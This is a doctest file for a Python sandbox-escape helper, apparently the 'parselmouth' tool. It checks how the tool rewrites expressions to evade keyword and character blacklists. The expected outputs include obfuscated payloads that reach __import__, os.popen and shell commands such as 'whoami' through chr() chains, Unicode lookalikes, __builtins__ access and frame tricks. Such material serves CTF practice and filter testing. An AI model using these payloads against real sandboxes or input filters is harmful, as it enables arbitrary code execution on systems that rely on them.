import functools

import parselmouth as p9h

"""
这里不全是可以 bypass 的测试用例
"""

def _test(t_cls, t_func, payload, kwd, rekwd, **xargs):
    p9h.BLACK_CHAR = {"kwd": kwd, "re_kwd": rekwd}

    if t_cls == "Bypass_Combo":
        bmap = xargs["maps"]
    else:
        bmap = {t_cls: t_func}

    p9h_ins = p9h.P9H(
        payload,
        specify_bypass_map={
            "white": bmap,
            "black": {},
        },
        depth=1,
        verbose=0,
    )
    print(p9h_ins.visit())


def test_Int():
    """
    >>> _test = functools.partial(_test, "Bypass_Int")
    >>> # ---------------------------------------------------

    >>> # ----- 小数字 -----
    >>> _test("by_trans", "1", ["1", ], "1")
    True

    >>> _test("by_cal", "1", ["1", ], "1")
    True

    >>> _test("by_unicode", "1", ["1", ], "1")
    int('𝟣')

    >>> _test("by_hex", "19", ["9"], "9")
    0x13

    >>> _test("by_bin", "9", ["9"], "9")
    0b1001

    >>> _test("by_ord", "19", ["19"], "19")
    ord('\\x13')

    >>> _test("by_ord", "10", ["1", "0"], "0|1")
    ord('\\n')

    >>> _test("by_ord", "9", ["1", "0", "9"], "0|1|9")
    ord('\\t')

    >>> _test("by_trans", "0", ["0", "False", "len", "any", "bool"], "0|False|len|any|bool")
    []!=[]

    >>> _test("by_trans", "1", ["1", "0", "True", "all", "len", "*"], r"1|0|True|all|len|\\*")
    []==[]

    >>> _test("by_cal", "0", ["0", "False", "len", "any", "bool"], "0|False|len|any|bool")
    []!=[]

    >>> _test("by_cal", "1", ["1", "0", "True", "all", "len", "*"], r"1|0|True|all|len|\\*")
    []==[]

    >>> _test("by_cal", "-1", ["1", ], "1")
    8-9

    >>> _test("by_unicode", "-1", ["1", ], "1")
    int('-𝟣')

    >>> # ----- 大数字 -----
    >>> _test("by_bin", "2024", ["2", "4"], "2|4")
    0b11111101000

    >>> _test("by_hex", "2024", ["2", "4"], "2|4")
    0x7e8

    >>> _test("by_cal", "2024", ["0", "1", "3", "4", "5", "6", "7", "8"], "[0|1|3-8]")
    92*22

    >>> _test("by_ord", "2024", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"], r"\\d")
    ord('ߨ')

    >>> _test("by_unicode", "2024", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"], "[0-9]")
    int('𝟤𝟢𝟤𝟦')

    >>> _test("by_hex", "-2024", ["2", "4"], "2|4")
    -0x7e8

    >>> _test("by_ord", "-2024", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"], r"\\d")
    -ord('ߨ')

    >>> _test("by_cal", "-2024", ["2", "4"], "2|4")
    9-19*107

    >>> _test("by_cal", "-2024", ["0", "1", "3", "4", "5", "6", "7", "8"], "0|1|[3-8]")
    9-9-92*22

    >>> _test("by_cal", "-2024", ["0", "1", "2", "3", "4", "5", "6", "7", "8"], "[0-8]")
    True-9-len(str(()))*(9+999)

    >>> _test("by_cal", "-2024", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"], "[0-9]")
    (len(str(()))+len(str(()))+True)**len(str(()))-True-len(str(()))**(len(str(()))+(len(str(()))+True)**len(str(())))
    """


def test_String():
    """
    >>> _test = functools.partial(_test, "Bypass_String")
    >>> # ---------------------------------------------------

    >>> # ----- 特殊测试 -----
    >>> _test("by_empty_str", "''", ["'", '"'], "'|\\"")
    str()

    >>> # ----- 引号限制 -----
    >>> _test("by_quote_trans", "'macr0phag3'", ["'", ], "'")
    "macr0phag3"

    >>> _test("by_quote_trans", "'你好世界'", ["'", ], "'")
    "你好世界"

    >>> _test("by_dict", "'macr0phag3'", ["'", '"'], "'|\\"")
    list(dict(macr0phag3=()))[0]

    >>> _test("by_dict", "'你好世界'", ["'", '"'], "'|\\"")
    list(dict(你好世界=()))[0]

    >>> # ----- 部分字符限制 -----
    >>> _test("by_char_add", "'macr0phag3'", ["mac", ], "mac")
    ('m'+'a'+'c'+'r'+'0'+'p'+'h'+'a'+'g'+'3')

    >>> _test("by_char_add", "'macr0phag3'", ["mac", "+"], r"mac|\\+")
    ''.join(('m','a','c','r','0','p','h','a','g','3'))

    >>> _test("by_hex_encode", "'macr0phag3'", ["mac", ], "mac")
    '\\x6d\\x61\\x63\\x72\\x30\\x70\\x68\\x61\\x67\\x33'

    >>> _test("by_unicode_encode", "'macr0phag3'", ["mac", ], "mac")
    '\\u006d\\u0061\\u0063\\u0072\\u0030\\u0070\\u0068\\u0061\\u0067\\u0033'

    >>> _test("by_char_format", "'macr0phag3'", ["mac", ], "mac")
    '%c%c%c%c%c%c%c%c%c%c'%(109,97,99,114,48,112,104,97,103,51)

    >>> _test("by_format", "'macr0phag3'", ["mac", ], "mac")
    '{}{}{}{}{}{}{}{}{}{}'.format(chr(109),chr(97),chr(99),chr(114),chr(48),chr(112),chr(104),chr(97),chr(103),chr(51))

    >>> _test("by_char", "'macr0phag3'", ["mac", ], "mac")
    (chr(109)+chr(97)+chr(99)+chr(114)+chr(48)+chr(112)+chr(104)+chr(97)+chr(103)+chr(51))

    >>> _test("by_reverse", "'macr0phag3'", ["mac", ], "mac")
    '3gahp0rcam'[::-1]

    >>> _test("by_bytes_single", "'macr0phag3'", ["mac", ], "mac")
    (str(bytes([109]))[2]+str(bytes([97]))[2]+str(bytes([99]))[2]+str(bytes([114]))[2]+str(bytes([48]))[2]+str(bytes([112]))[2]+str(bytes([104]))[2]+str(bytes([97]))[2]+str(bytes([103]))[2]+str(bytes([51]))[2])

    >>> _test("by_bytes_full", "'macr0phag3'", ["mac", ], "mac")
    bytes([109,97,99,114,48,112,104,97,103,51]).decode()

    >>> # ----- 非 ascii 码字符测试 -----
    >>> _test("by_char_add", "'你好世界'", ["你好", ], "你好")
    ('你'+'好'+'世'+'界')

    >>> _test("by_unicode_encode", "'你好世界'", ["你好", ], "你好")
    '\\u4f60\\u597d\\u4e16\\u754c'

    >>> _test("by_char_format", "'你好世界'", ["你好", ], "你好")
    '%c%c%c%c'%(20320,22909,19990,30028)

    >>> _test("by_format", "'你好世界'", ["你好", ], "你好")
    '{}{}{}{}'.format(chr(20320),chr(22909),chr(19990),chr(30028))

    >>> _test("by_char", "'你好世界'", ["你好", ], "你好")
    (chr(20320)+chr(22909)+chr(19990)+chr(30028))

    >>> _test("by_reverse", "'你好世界'", ["你好", ], "你好")
    '界世好你'[::-1]

    >>> _test("by_doc_index", "'system'", ["'", '"'], "'|\\"")
    (id.__doc__[38]+id.__doc__[18]+id.__doc__[38]+id.__doc__[2]+id.__doc__[1]+id.__doc__[68])

    >>> _test("by_doc_index", "'system'", ["'", '"', "system", "id", "a", "b"], "'|\\"|system|id|a|b")
    (dir.__doc__[19]+dir.__doc__[461]+dir.__doc__[19]+dir.__doc__[10]+dir.__doc__[8]+dir.__doc__[59])
    """


def test_Name():
    """
    >>> _test = functools.partial(_test, "Bypass_Name")
    >>> # ---------------------------------------------------

    >>> _test("by_unicode", "__import__", ["__", ], "__")
    _＿import_＿

    >>> _test("by_unicode", "__import__", ["_i", ], "_i")
    __𝒊mport__

    >>> _test("by_unicode", "__import__", ["imp", "rt"], "imp|rt")
    __𝒊mpo𝒓t__

    >>> _test("by_builtins_attr", "__import__", [], "^__import__$")
    __builtins__.__import__

    >>> _test("by_builtins_item", "__import__", [], "^__import__$")
    __builtins__['__import__']

    >>> _test("by_builtin_func_self", "__import__", [], "^__import__$")
    id.__self__.__import__

    >>> _test("by_builtin_func_self", "__import__", [], "id|^__import__$")
    abs.__self__.__import__

    >>> _test("by_frame", "__import__", [], "^__import__$")
    (i for i in ()).gi_frame.f_builtins['__import__']

    >>> _test("by_running_frame", "__import__", [], "^__import__$")
    [[*a[0]].pop() for a in [[]] if [a.append((i.gi_frame.f_back for i in a))]][0].f_back.f_builtins['__import__']

    # ----- 无法 bypass ----- 
    >>> _test("by_frame", "__import__", ["gi_frame.f_builtins"], r"^__import__$|gi_frame\\.f_builtins")
    getattr((i for i in ()).gi_frame,'f_builtins')['__import__']

    >>> _test("by_running_frame", "__import__", ["gi_frame.f_builtins"], r"^__import__$|gi_frame\\.f_builtins")
    [[*a[0]].pop() for a in [[]] if [a.append((i.gi_frame.f_back for i in a))]][0].f_back.f_builtins['__import__']

    >>> _test("by_unicode", "dict(a=__import__)", ["__i"], "__i")
    dict(a=_＿import__)

    >>> _test("by_builtins_attr", "dict(a=__import__)", [], "^__import__$")
    dict(a=__builtins__.__import__)

    >>> _test("by_builtins_item", "dict(a=__import__)", [], "^__import__$")
    dict(a=__builtins__['__import__'])

    >>> _test("by_builtin_func_self", "dict(a=__import__)", [], "^__import__$")
    dict(a=id.__self__.__import__)

    >>> _test("by_running_frame", "dict(a=__import__)", [], "^__import__$")
    dict(a=[[*a[0]].pop() for a in [[]] if [a.append((i.gi_frame.f_back for i in a))]][0].f_back.f_builtins['__import__'])
    """


def test_Attribute():
    """
    >>> _test = functools.partial(_test, "Bypass_Attribute")
    >>> # ---------------------------------------------------

    >>> _test("by_getattr", "os.system", [".", ], r"\\.")
    getattr(os,'system')

    >>> _test("by_vars", "os.system", [".", ], r"\\.")
    vars(os)['system']

    >>> _test("by_dict_attr", "os.system", [".system", ], r"\\.system")
    os.__dict__['system']
    """


def test_Subscript():
    """
    >>> _test = functools.partial(_test, "Bypass_Subscript")
    >>> # ---------------------------------------------------

    >>> _test("by_getitem_attr", "a[0]", ["["], r"\\[")
    a.__getitem__(0)

    >>> _test("by_getitem_getattr", "a[0]", ["["], r"\\[")
    getattr(a,'__getitem__')(0)

    >>> _test("by_getitem_attr", "a[1:2]", ["["], r"\\[")
    a.__getitem__(slice(1,2))

    >>> _test("by_getitem_getattr", "a[:2]", ["["], r"\\[")
    getattr(a,'__getitem__')(slice(None,2))

    >>> _test("by_getitem_attr", "a[::2]", ["["], r"\\[")
    a.__getitem__(slice(None,None,2))

    # ----- 暂时只支持一元索引 -----
    >>> _test("by_getitem_attr", "a[0,1]", ["["], r"\\[")
    a[0,1]

    >>> _test("by_getitem_getattr", "a[1:2,3]", ["["], r"\\[")
    a[1:2,3]
    """


def test_Keyword():
    """
    >>> _test = functools.partial(_test, "Bypass_Keyword")
    >>> # ---------------------------------------------------

    >>> _test("by_unicode", "dict(abc=1)", ["abc", ], "abc")
    dict(𝒂bc=1)

    # ----- 无法进行 bypass -----
    >>> _test("by_unicode", "dict(__import__=1)", ["imp", "𝒊"], "imp|𝒊")
    dict(__import__=1)
    """


def test_BoolOp():
    """
    >>> _test = functools.partial(_test, "Bypass_BoolOp")
    >>> # ---------------------------------------------------

    >>> _test("by_bitwise", "'yes' if 1 and (2 or 3) or 2 and 3 else 'no'", ["or", "and"], "or|and")
    'yes' if 1&(2|3)|2&3 else 'no'

    >>> _test("by_arithmetic", "'yes' if (__import__ and (2 or 3)) or (2 and 3) else 'no'", ["or", "and"], "or|and")
    'yes' if bool(bool(__imp𝒐rt__)*bool(bool(2)+bool(3)))+bool(bool(2)*bool(3)) else 'no'
    """


def test_Combo():
    """
    >>> # 组合测试
    >>> _test = functools.partial(_test, "Bypass_Combo")
    >>> # ---------------------------------------------------

    >>> # ----- Int -----
    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "1", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "True", "all"], r"\\d|all|True", maps=maps)
    []==[]

    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "12", ["1", "2", "True"], "1|2|True", maps=maps)
    9+3

    >>> maps = {"Bypass_Int": "by_trans"}; _test(..., "1", ["1", "True", "all", "(", "*", "+"], r"1|True|all|\\(|\\*|\\+", maps=maps)
    []==[]

    >>> maps = {"Bypass_Int": "by_trans"}; _test(..., "2", ["2", "True"], "2|True", maps=maps)
    len(str(()))

    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "1", ["0", "1", "3", "4", "5", "6", "7", "8", "True", "False", "*", "+"], r"[0|1|3-8]|True|False|\\*|\\+", maps=maps)
    all(())

    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "-1", ["0", "1", "3", "4", "5", "6", "7", "8", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "True", "False", "*"], r"[0|1|3-8|a-z|True|False|\\*]", maps=maps)
    ([]==[])-2

    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "-1", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "*", "+"], r"[0-9|\\*|\\+]", maps=maps)
    True-len(str(()))

    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "1000", ["0", "1", "2", "3", "4", "5", "6", "7", "9", "-", "*", "True", "False"], r"[0-6|7|9|\\-|\\*]|True|False", maps=maps)
    8+8+8+88+888

    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "2024", ["0", "1", "3", "4", "5", "6", "7", "8", "True", "False", "*"], r"[0|1|3-8]|True|False|\\*", maps=maps)
    9+9+992+992+22

    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "2024", ["1", "2", "4", "*"], r"1|2|4|\\*", maps=maps)
    99+995+930

    >>> # ----- String -----
    >>> maps = {"Bypass_String": "by_char_add, by_dict"}; _test(..., "'macr0phag3'", ["'", "\\"", "mac"], "'|\\"|mac", maps=maps)
    (list(dict(m=()))[0]+list(dict(a=()))[0]+list(dict(c=()))[0]+list(dict(r=()))[0]+list(dict(a0=()))[0][1:]+list(dict(p=()))[0]+list(dict(h=()))[0]+list(dict(a=()))[0]+list(dict(g=()))[0]+list(dict(a3=()))[0][1:])

    >>> maps = {"Bypass_String": "by_char_add, by_hex_encode"}; _test(..., "'__import__'", ["__", "o"], "__|o", maps=maps)
    ('_'+'_'+'i'+'m'+'p'+'\\x6f'+'r'+'t'+'_'+'_')

    >>> maps = {"Bypass_String": "by_char_add, by_unicode_encode"}; _test(..., "'__import__'", ["__", "o"], "__|o", maps=maps)
    ('_'+'_'+'i'+'m'+'p'+'\\u006f'+'r'+'t'+'_'+'_')

    >>> maps = {"Bypass_String": "by_char_add, by_char_format"}; _test(..., "'__import__'", ["__", "o"], "__|o|𝒐", maps=maps)
    ('_'+'_'+'i'+'m'+'p'+'%c'%111+'r'+'t'+'_'+'_')

    >>> maps = {"Bypass_String": "by_char_add, by_format, by_char"}; _test(..., "'__import__'", ["__", "'", '"'], "__|'|\\"", maps=maps)
    (((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(95))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(95))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(105))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(109))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(112))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(111))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(114))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(116))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(95))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(95)))

    >>> maps = {"Bypass_String": "by_char_add, by_char"}; _test(..., "'__import__'", ["__", "o"], "__|o", maps=maps)
    ('_'+'_'+'i'+'m'+'p'+chr(111)+'r'+'t'+'_'+'_')

    >>> maps = {"Bypass_String": "by_char_add, by_bytes_single"}; _test(..., "'__import__'", ["__", "i"], "__|i", maps=maps)
    ('_'+'_'+str(bytes([105]))[2]+'m'+'p'+'o'+'r'+'t'+'_'+'_')

    >>> maps = {"Bypass_String": "by_char_add, by_bytes_full"}; _test(..., "'__import__'", ["__", "i"], "__|i", maps=maps)
    ('_'+'_'+bytes([105]).decode()+'m'+'p'+'o'+'r'+'t'+'_'+'_')

    >>> maps = {"Bypass_String": "by_hex_encode, by_dict", "Bypass_Name": "by_unicode", "Bypass_Keyword": "by_unicode"}; _test(..., "'__import__'", ["__", "n"], "__|n", maps=maps)
    mi𝒏(dict(_＿import_＿=()))

    >>> # ----- Attribute -----
    >>> maps = {"Bypass_Attribute": "by_getattr", "Bypass_String": "by_dict", "Bypass_Keyword": "by_unicode"}; _test(..., "os.system", [".", "sys", '"', "'"], r"\\.|sys|'|\\\"", maps=maps)
    getattr(os,min(dict(𝒔ystem=())))

    >>> maps = {"Bypass_Attribute": "by_vars", "Bypass_String": "by_dict", "Bypass_Keyword": "by_unicode"}; _test(..., "os.system", [".", "sys", '"', "'"], r"\\.|sys|'|\\\"", maps=maps)
    vars(os)[min(dict(𝒔ystem=()))]

    >>> # ----- Call -----
    >>> maps = {"Bypass_Call": "by_builtin_func_self"}; _test(..., "__import__('os')", [], "^__import__[(]", maps=maps)
    id.__self__.__import__('os')

    >>> maps = {"Bypass_Call": "by_builtins_item"}; _test(..., "__import__('os')", [], "^__import__[(]", maps=maps)
    __builtins__['__import__']('os')

    >>> # ----- Name -----
    >>> maps = {"Bypass_Name": "by_builtins_attr", "Bypass_String": "by_char_add, by_char", "Bypass_Attribute": "by_getattr"}; _test(..., "__import__", [".", "import", '"', "'"], r"\\.|import|'|\\\"", maps=maps)
    getattr(__builtins__,(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)))

    >>> # ----- Integrated -----
    >>> maps = {"Bypass_Name": "by_builtins_attr", "Bypass_String": "by_char_add, by_char", "Bypass_Attribute": "by_getattr"}; _test(..., "__import__('os').popen('whoami').read()", [".", "import", '"', "'"], r"\\.|import|'|\\\"", maps=maps)
    getattr(getattr(getattr(__builtins__,chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))(chr(111)+chr(115)),chr(112)+chr(111)+chr(112)+chr(101)+chr(110))(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)),(chr(114)+chr(101)+chr(97)+chr(100)))()

    >>> maps = {"Bypass_Name": "by_builtins_item", "Bypass_String": "by_char_add, by_char"}; _test(..., "__import__('os')", ["import", '"', "'"], r"import|'|\\\"", maps=maps)
    __builtins__[(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))]((chr(111)+chr(115)))

    >>> maps = {"Bypass_Name": "by_frame", "Bypass_String": "by_char_add"}; _test(..., '__import__("os")', ["__", "＿"], "__|＿", maps=maps)
    (i for i in ()).gi_frame.f_builtins[('_'+'_'+'i'+'m'+'p'+'o'+'r'+'t'+'_'+'_')]('os')

    >>> maps = {"Bypass_Name": "by_unicode", "Bypass_String": "by_char, by_char_add, by_char_format", "Bypass_Attribute": "by_getattr"}; _test(..., "__import__('os').popen('whoami').read()", ["__", ".", "'", '"', "read", "chr"], r"__|\\.|'|\\\"|read|chr", maps=maps)
    getattr(getattr(_＿import_＿(((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%111+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%115),((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%112+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%111+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%112+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%101+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%110)(((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%119+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%104+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%111+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%97+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%109+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%105),(((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%114+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%101+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%97+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%100))()

    >>> maps = {"Bypass_Name": "by_unicode", "Bypass_String": "by_char, by_char_add, by_char_format", "Bypass_Attribute": "by_getattr", "Bypass_Int": "by_cal"}; _test(..., "__import__('os').popen('whoami').read()", ["__", ".", "'", '"', "read", "chr", "0", "1"], r"__|\\.|'|\\\"|read|chr|0|1", maps=maps)
    getattr(getattr(_＿import_＿(((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(3*37)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(5*23)),((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(4*28)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(3*37)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(4*28)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(9+92)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(5*22))(((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(998-879)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(9+95)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(3*37)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%97+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(998-889)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(9+96)),(((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(3*38)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(9+92)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%97+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(8+92)))()

    >>> maps = {"Bypass_String": "by_doc_index"}; _test(..., "__import__('os').popen('whoami').read()", ["'", '"', "os", "sys", "b"], "os|sys|'|\\\"|b", maps=maps)
    __import__((id.__doc__[20]+id.__doc__[38])).popen((dir.__doc__[44]+dir.__doc__[47]+dir.__doc__[5]+dir.__doc__[38]+dir.__doc__[59]+dir.__doc__[1])).read()
    """
